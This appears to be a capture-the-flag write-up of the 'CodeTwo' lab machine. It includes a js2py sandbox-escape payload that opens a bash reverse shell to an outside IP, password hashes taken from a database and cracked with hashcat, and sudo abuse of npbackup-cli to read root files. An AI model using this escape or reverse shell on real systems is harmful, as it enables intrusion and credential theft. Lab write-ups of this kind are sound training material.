@@ -1,0 +1,92 @@
+nmap -sV codetwo.htb
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http    Gunicorn 20.0.4
+
+neat, website we can access at the 8000 port and open it in burp
+
+- ffuf -u http://codetwo.htb:8000 -w /usr/share/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt -H "Host:FUZZ.codetwo.htb" -fs 2184
+	- also nothing found here
+- feroxbuster -u http://codetwo.htb:8000 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+	- nothing found here
+
+the website has some code that we can download and unzip, we can notice that it is a Flask app, and immediately find a secret key in the code: S3cr3tK3yC0d3Tw0
+
+in the instance directory, we can find a users.db sql db file which we can open in DBBrowser, which has nothing in it atm
+
+http://codetwo.htb:8000/dashboard allows us to run some JS code which might run on the server and just spit out output lol:
+
+js2py v0.74 is in requirements.txt and exploitable, we can submit the following code into the frontend w/ a listener active to get a shell:
+
+let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.15.84/4444 0>&1'";
+
+let hacked, bymarve, n11;
+let getattr, obj;
+
+hacked = Object.getOwnPropertyNames({});
+bymarve = hacked.__getattribute__;
+n11 = bymarve("__getattribute__");
+obj = n11("__class__").__base__;
+getattr = obj.__getattribute__;
+
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i];
+        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
+            return item;
+        }
+        if(item.__name__ != "type" && (result = findpopen(item))) {
+            return result;
+        }
+    }
+}
+
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
+console.log(n11);
+n11
+
+ggs we got a shell! Keep going backwards and we can see marco is another user on the machine, but no access to him, let's just get linpeas going, findings:
+- machine is Vulnerable to CVE-2021-3560, polkit stuff
+- MySQL is found in /etc/MySQL, can enter db w/ mysql -u mysql -pS3cr3tK3yC0d3Tw0
+- file w/ interesting perms: /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614) 
+- weird active port: 127.0.0.53:53, ignore ig
+
+MySQL bin doesn't exist. Tip from chroma was to check users.db under instance/ directory and ye we can find creds:
+
+koussay202cb962ac59075b964b07152d234b70(Mevilc8dbfc5335aec197070b3162d3093f7c(Mtest098f6bcd4621d373cade4e832627b4f6'Mappa97588c0e2fa3a024876339e27aeb42e)Mmarco649c9d65a206a75f5abe509fe128bce5
+
+note the marco user, we need to crack his hash tho, which we actually know is a simple MD5 hash from the app.py code:
+- password_hash = hashlib.md5(password.encode()).hexdigest()
+
+crack w/ hashcat:
+- echo "649c9d65a206a75f5abe509fe128bce5" >> hash.txt
+- hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+ezpz crack: sweetangelbabylove
+
+now ssh:
+- ssh marco@codetwo.htb 
+- cat user.txt!
+
+Now we see some jank stuff in his home dir; backups dir we can't view and npbackup.conf file which shows some obfuscated stuff, gonna run linpeas again instead
+- still vulnerable to CVE-2021-3560
+- sshd: process found (dump creds from memory as root), 
+- fail2ban service has writable path which we could use to load our own exe after reloading the service?
+	- fail2ban.service: Uses relative path 'ExecStart=/usr/bin/fail2ban-server' (from # ExecStart=/usr/bin/fail2ban-server -xf --logtarget=sysout start)
+- can run /usr/local/bin/npbackup-cli with no password
+- binaries w/ capabilities:
+	- /usr/bin/mtr-packet = cap_net_raw+ep; no work
+	- /usr/bin/traceroute6.iputils = cap_net_raw+ep
+	- /usr/bin/ping = cap_net_raw+ep; no work
+	- /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+we can abuse nobackup-cli to backup the root flag then dump it afterwards:
+- edit npbackup to include /root/ as path
+- sudo npbackup-cli -c npbackup.conf -b -f
+- sudo npbackup-cli -c npbackup.conf --dump /root/root.txt
+
+gee gee
+ 
+
